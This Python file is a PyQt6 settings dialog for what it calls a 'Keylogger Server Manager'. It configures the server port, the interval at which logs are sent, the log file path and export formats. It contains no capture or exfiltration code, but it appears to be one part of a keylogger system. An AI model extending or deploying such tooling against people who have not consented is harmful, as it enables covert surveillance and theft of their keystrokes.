"""
Settings Window for Keylogger Server Manager
"""

import os
from PyQt6.QtWidgets import (
    QDialog, QVBoxLayout, QHBoxLayout, QLabel, QPushButton,
    QCheckBox, QSpinBox, QLineEdit, QGroupBox, QFormLayout,
    QFileDialog, QMessageBox, QComboBox
)

DEFAULT_SETTINGS = {
    "auto_stop_enabled": False,
    "auto_stop_minutes": 60,
    "send_interval_seconds": 300,
    "server_port": 9999,
    "default_export_folder": "",
    "default_export_format": "txt",
    "log_file_path": "server-copy.txt",
}

class SettingsWindow(QDialog):
    """Settings configuration window"""
    
    def __init__(self, parent=None, current_settings=None):
        super().__init__(parent)
        self.setWindowTitle("Settings")
        self.setGeometry(200, 200, 500, 450)
        self.settings = current_settings or DEFAULT_SETTINGS.copy()
        
        self.setup_ui()
        self.load_settings()
        self.apply_styles()
    
    def setup_ui(self):
        layout = QVBoxLayout()
        
        # Auto Stop Settings
        auto_stop_group = QGroupBox("Auto Stop Server")
        auto_stop_layout = QVBoxLayout()
        
        self.auto_stop_checkbox = QCheckBox("Enable automatic server stop")
        auto_stop_layout.addWidget(self.auto_stop_checkbox)
        
        time_layout = QHBoxLayout()
        time_layout.addWidget(QLabel("Stop after:"))
        self.auto_stop_time = QSpinBox()
        self.auto_stop_time.setRange(1, 1440)
        self.auto_stop_time.setSuffix(" minutes")
        self.auto_stop_time.setEnabled(False)
        time_layout.addWidget(self.auto_stop_time)
        time_layout.addStretch()
        auto_stop_layout.addLayout(time_layout)
        
        self.auto_stop_checkbox.toggled.connect(self.auto_stop_time.setEnabled)
        auto_stop_group.setLayout(auto_stop_layout)
        layout.addWidget(auto_stop_group)
        
        # Network Settings
        network_group = QGroupBox("Network Configuration")
        network_layout = QFormLayout()
        
        self.port_input = QSpinBox()
        self.port_input.setRange(1024, 65535)
        network_layout.addRow("Server Port:", self.port_input)
        
        self.send_interval = QSpinBox()
        self.send_interval.setRange(10, 3600)
        self.send_interval.setSuffix(" seconds")
        network_layout.addRow("Send Logs Interval:", self.send_interval)
        
        network_group.setLayout(network_layout)
        layout.addWidget(network_group)
        
        # File Settings
        file_group = QGroupBox("File Configuration")
        file_layout = QVBoxLayout()
        
        log_layout = QHBoxLayout()
        log_layout.addWidget(QLabel("Log File:"))
        self.log_file_input = QLineEdit()
        log_layout.addWidget(self.log_file_input)
        file_layout.addLayout(log_layout)
        
        export_layout = QHBoxLayout()
        export_layout.addWidget(QLabel("Export Folder:"))
        self.export_folder_input = QLineEdit()
        export_layout.addWidget(self.export_folder_input)
        browse_btn = QPushButton("Browse")
        browse_btn.clicked.connect(self.browse_export_folder)
        export_layout.addWidget(browse_btn)
        file_layout.addLayout(export_layout)
        
        format_layout = QHBoxLayout()
        format_layout.addWidget(QLabel("Default Format:"))
        self.format_combo = QComboBox()
        self.format_combo.addItems(["txt", "csv", "json"])
        format_layout.addWidget(self.format_combo)
        format_layout.addStretch()
        file_layout.addLayout(format_layout)
        
        file_group.setLayout(file_layout)
        layout.addWidget(file_group)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        reset_btn = QPushButton("Reset to Defaults")
        reset_btn.clicked.connect(self.reset_defaults)
        button_layout.addWidget(reset_btn)
        
        button_layout.addStretch()
        
        cancel_btn = QPushButton("Cancel")
        cancel_btn.clicked.connect(self.reject)
        button_layout.addWidget(cancel_btn)
        
        save_btn = QPushButton("Save")
        save_btn.clicked.connect(self.save_settings)
        button_layout.addWidget(save_btn)
        
        layout.addLayout(button_layout)
        self.setLayout(layout)
    
    def load_settings(self):
        """Load current settings into form"""
        self.auto_stop_checkbox.setChecked(self.settings["auto_stop_enabled"])
        self.auto_stop_time.setValue(self.settings["auto_stop_minutes"])
        self.send_interval.setValue(self.settings["send_interval_seconds"])
        self.port_input.setValue(self.settings["server_port"])
        self.export_folder_input.setText(self.settings["default_export_folder"])
        self.log_file_input.setText(self.settings["log_file_path"])
        
        format_index = self.format_combo.findText(self.settings.get("default_export_format", "txt"))
        if format_index >= 0:
            self.format_combo.setCurrentIndex(format_index)
    
    def browse_export_folder(self):
        """Browse for export folder"""
        folder = QFileDialog.getExistingDirectory(self, "Select Export Folder")
        if folder:
            self.export_folder_input.setText(folder)
    
    def save_settings(self):
        """Save settings and close"""
        self.settings["auto_stop_enabled"] = self.auto_stop_checkbox.isChecked()
        self.settings["auto_stop_minutes"] = self.auto_stop_time.value()
        self.settings["send_interval_seconds"] = self.send_interval.value()
        self.settings["server_port"] = self.port_input.value()
        self.settings["default_export_folder"] = self.export_folder_input.text()
        self.settings["log_file_path"] = self.log_file_input.text()
        self.settings["default_export_format"] = self.format_combo.currentText()
        self.accept()
    
    def reset_defaults(self):
        """Reset all settings to defaults"""
        reply = QMessageBox.question(
            self, "Reset Settings",
            "Reset all settings to defaults?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        
        if reply == QMessageBox.StandardButton.Yes:
            self.settings = DEFAULT_SETTINGS.copy()
            self.load_settings()
    
    def apply_styles(self):
        """Apply dark theme styles"""
        self.setStyleSheet("""
            QDialog {
                background-color: #2b2b2b;
                color: #f0f0f0;
            }
            QGroupBox {
                border: 1px solid #444;
                border-radius: 5px;
                margin-top: 10px;
                padding-top: 10px;
                color: #ffffff;
                font-weight: bold;
            }
            QLabel {
                color: #f0f0f0;
            }
            QPushButton {
                background-color: #444;
                border: 1px solid #555;
                border-radius: 4px;
                padding: 5px;
                color: white;
                min-width: 80px;
            }
            QPushButton:hover {
                background-color: #666;
            }
            QLineEdit, QSpinBox, QComboBox {
                background-color: #1e1e1e;
                color: #f0f0f0;
                border: 1px solid #444;
                padding: 3px;
            }
            QComboBox::drop-down {
                border: none;
            }
            QComboBox::down-arrow {
                image: none;
                border-left: 4px solid transparent;
                border-right: 4px solid transparent;
                border-top: 4px solid #f0f0f0;
                margin-right: 5px;
            }
            QCheckBox {
                color: #f0f0f0;
            }
        """)